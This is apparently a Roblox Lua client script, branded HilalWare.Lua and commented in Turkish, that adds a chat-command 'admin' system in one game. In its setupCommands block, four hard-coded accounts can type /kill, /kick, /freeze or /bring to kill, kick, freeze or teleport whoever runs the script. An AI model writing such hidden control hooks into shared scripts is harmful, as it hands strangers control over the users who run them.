local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local TeleportService = game:GetService("TeleportService")

local PLACE_ID_TO_CHECK = 7267631004

-- Yetkililer
local allowedUsers = {
    ["q692q"] = true,
    ["muhammet_bekir2004"] = true,
    ["HilalWare_Lua"] = true,
    ["Muhammet_bekir2003"] = true
}

-- İlk script (uyarı ekranı) fonksiyonunu modüler yapalım
local function loadWarningGui()
    -- Buraya senin gönderdiğin uyarı ekranı GUI kodunu koyabilirsin,
    -- veya modüler olarak require ile çağırabilirsin.
    -- Örnek olarak direkt require yaparsan şöyle olabilir:
    local success, screenGui = pcall(function()
        return require(script:WaitForChild("WarningGuiModule")) -- uyarı ekranını modül yaptığını varsayıyorum
    end)
    if not success then
        warn("Warning GUI yüklenemedi.")
    end
end

-- İkinci scriptin tamamı (admin sistemi, RGB vs.)
local function loadAdminScript()
    -- Buraya senin verdiğin admin kodunu komple koyacaksın,
    -- aşağıda kısaltarak ekliyorum, tam kodu buraya yapıştırabilirsin:
    
    -- Her harfe ayrı RGB sağdan sola efekti
    local function applyRGBRightToLeft(textLabel)
        local hue = 0
        local text = textLabel.Text
        local letters = {}

        textLabel.Text = ""
        for i = 1, #text do
            local char = string.sub(text, i, i)
            local charLabel = Instance.new("TextLabel")
            charLabel.Size = UDim2.new(1 / #text, 0, 1, 0)
            charLabel.Position = UDim2.new((i - 1) / #text, 0, 0, 0)
            charLabel.BackgroundTransparency = 1
            charLabel.Text = char
            charLabel.Font = textLabel.Font
            charLabel.TextScaled = true
            charLabel.TextStrokeTransparency = textLabel.TextStrokeTransparency
            charLabel.Parent = textLabel
            table.insert(letters, charLabel)
        end

        RunService.RenderStepped:Connect(function()
            hue = (hue + 0.01) % 1
            for i = #letters, 1, -1 do
                local offset = (i / #letters)
                local color = Color3.fromHSV((hue + offset) % 1, 1, 1)
                letters[i].TextColor3 = color
            end
        end)
    end

    local function addAdminTag(player)
        local function onCharacterAdded(character)
            local head = character:WaitForChild("Head", 5)
            if head then
                local billboard = Instance.new("BillboardGui")
                billboard.Size = UDim2.new(0, 200, 0, 50)
                billboard.StudsOffset = Vector3.new(0, 2, 0)
                billboard.Adornee = head
                billboard.AlwaysOnTop = true
                billboard.Parent = head

                local textLabel = Instance.new("TextLabel")
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.BackgroundTransparency = 1
                textLabel.Text = "Yönetici"
                textLabel.TextStrokeTransparency = 0
                textLabel.Font = Enum.Font.GothamBold
                textLabel.Parent = billboard

                applyRGBRightToLeft(textLabel)
            end
        end

        player.CharacterAdded:Connect(onCharacterAdded)
        if player.Character then
            onCharacterAdded(player.Character)
        end
    end

    local function setAnchoredAllParts(char, anchored)
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = anchored
            end
        end
    end

    local frozen = false

    local function setupCommands(player)
        player.Chatted:Connect(function(message)
            message = string.lower(message)

            if message == "/kill" then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    LocalPlayer.Character.Humanoid.Health = 0
                end
            elseif message == "/kick" then
                LocalPlayer:Kick("Yetkili tarafından oyundan atıldınız.")
            elseif message == "/freeze" then
                if LocalPlayer.Character then
                    frozen = true
                    setAnchoredAllParts(LocalPlayer.Character, true)
                end
            elseif message == "/unfreeze" then
                if LocalPlayer.Character then
                    frozen = false
                    setAnchoredAllParts(LocalPlayer.Character, false)
                end
            elseif message == "/bring" then
                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                end
            end
        end)
    end

    Players.PlayerAdded:Connect(function(player)
        if allowedUsers[player.Name] then
            addAdminTag(player)
            setupCommands(player)
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "Hoş Geldiniz " .. player.Name,
                Color = Color3.fromRGB(0, 255, 0),
                Font = Enum.Font.SourceSansBold,
                TextSize = 20
            })
        end
    end)

    for _, player in ipairs(Players:GetPlayers()) do
        if allowedUsers[player.Name] then
            addAdminTag(player)
            setupCommands(player)
        end
    end

    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "By HilalWare.Lua",
        Color = Color3.fromRGB(255, 255, 0),
        Font = Enum.Font.SourceSansBold,
        TextSize = 20
    })

    task.delay(20, function()
        StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "HilalWare.Lua New Script",
            Color = Color3.fromRGB(255, 255, 0),
            Font = Enum.Font.SourceSansBold,
            TextSize = 20
        })
    end)
end

-- Kontrol ve yükleme
if game.PlaceId == PLACE_ID_TO_CHECK then
    loadAdminScript()
else
    loadWarningGui()
end
